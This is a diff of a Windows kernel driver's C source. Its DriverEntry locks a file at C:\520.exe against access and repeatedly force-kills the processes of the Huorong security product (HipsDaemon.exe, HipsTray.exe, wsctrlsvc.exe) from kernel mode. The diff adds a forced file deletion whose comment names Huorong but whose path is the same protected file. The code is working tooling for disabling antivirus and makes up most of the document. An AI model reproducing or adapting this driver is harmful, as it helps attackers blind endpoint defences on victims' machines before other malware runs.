@@ -1,74 +1,11 @@
 #include "ForceKillProcess.h"
 #include "FileProtect.h"
 #include "Driver.h"
+#include "ForceDelete.h"
 
 
 
 PFILE_OBJECT g_pFileObject = NULL;
-
-NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegPath)
-{
-	DbgPrint("Enter DriverEntry\n");
-
-	NTSTATUS status = STATUS_SUCCESS;
-	pDriverObject->DriverUnload = DriverUnload;
-	pDriverObject->MajorFunction[IRP_MJ_CREATE] = DriverDefaultHandle;
-	pDriverObject->MajorFunction[IRP_MJ_CLOSE] = DriverDefaultHandle;
-	pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DriverControlHandle;
-
-	/*
-	for (ULONG i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
-	{
-		pDriverObject->MajorFunction[i] = DriverDefaultHandle;
-	}*/
-
-	
-
-	status = CreateDevice(pDriverObject);
-
-	// 保护文件
-	UNICODE_STRING ustrFileName;
-	RtlInitUnicodeString(&ustrFileName, L"C:\\520.exe");
-	g_pFileObject = ProtectFile(ustrFileName);
-
-	//强制删除文件火绒
-
-
-	HANDLE processId;
-	PCWSTR huorongProcessName[3] = { L"HipsDaemon.exe" , L"HipsTray.exe",L"wsctrlsvc.exe" };
-	
-	LARGE_INTEGER interval;
-	interval.QuadPart = -30 * 1000 * 1000 * 10; // 10 seconds in 100-nanosecond intervals
-	
-	// 
-	//while (1) {
-	for (int killcount = 0; killcount < 3; killcount++) {
-		for (int i = 0; i < 3; i++) {
-			status = GetProcessIdByName(huorongProcessName[i], &processId);
-			if (NT_SUCCESS(status)) {
-				DbgPrint("Process %ws found with PID: %d\n", huorongProcessName[i], processId);
-				// 强制结束指定进程
-				ForceKillProcess(processId);
-			}
-			else {
-				DbgPrint("Process %ws not found. Status: 0x%x\n", huorongProcessName[i], status);
-				break;
-			}
-		}
-		KeDelayExecutionThread(KernelMode, FALSE, &interval);
-	}
-	
-		
-		
-
-	//}
-
-
-	DbgPrint("Leave DriverEntry\n");
-	return status;
-}
-
-
 
 VOID DriverUnload(PDRIVER_OBJECT pDriverObject)
 {
@@ -160,3 +97,69 @@ NTSTATUS CreateDevice(PDRIVER_OBJECT pDriverObject)
 	DbgPrint("Leave CreateDevice\n");
 	return status;
 }
+
+
+NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegPath)
+{
+	DbgPrint("Enter DriverEntry\n");
+
+	NTSTATUS status = STATUS_SUCCESS;
+	pDriverObject->DriverUnload = DriverUnload;
+	pDriverObject->MajorFunction[IRP_MJ_CREATE] = DriverDefaultHandle;
+	pDriverObject->MajorFunction[IRP_MJ_CLOSE] = DriverDefaultHandle;
+	pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DriverControlHandle;
+
+	/*
+	for (ULONG i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
+	{
+		pDriverObject->MajorFunction[i] = DriverDefaultHandle;
+	}*/
+
+
+
+	status = CreateDevice(pDriverObject);
+
+	// 保护文件
+	UNICODE_STRING protectFileName;
+	RtlInitUnicodeString(&protectFileName, L"C:\\520.exe");
+	g_pFileObject = ProtectFile(protectFileName);
+
+	
+	PCWSTR huorongProcessName[3] = { L"HipsDaemon.exe" , L"HipsTray.exe",L"wsctrlsvc.exe" };
+
+	//强制结束进程
+	HANDLE processId;
+	LARGE_INTEGER interval;
+	interval.QuadPart = -30 * 1000 * 1000 * 10; // 10 seconds in 100-nanosecond intervals
+	// 
+	//while (1) {
+	for (int killcount = 0; killcount < 3; killcount++) {
+		for (int i = 0; i < 3; i++) {
+			status = GetProcessIdByName(huorongProcessName[i], &processId);
+			if (NT_SUCCESS(status)) {
+				DbgPrint("Process %ws found with PID: %d\n", huorongProcessName[i], processId);
+				// 强制结束指定进程
+				ForceKillProcess(processId);
+			}
+			else {
+				DbgPrint("Process %ws not found. Status: 0x%x\n", huorongProcessName[i], status);
+				break;
+			}
+		}
+		KeDelayExecutionThread(KernelMode, FALSE, &interval);
+	}
+	
+		
+		
+	//强制删除文件火绒
+	UNICODE_STRING forceDelFileName;
+	RtlInitUnicodeString(&forceDelFileName, L"C:\\520.exe");
+	status = ForceDeleteFile(forceDelFileName);
+	
+
+	DbgPrint("Leave DriverEntry\n");
+	return status;
+}
+
+
+
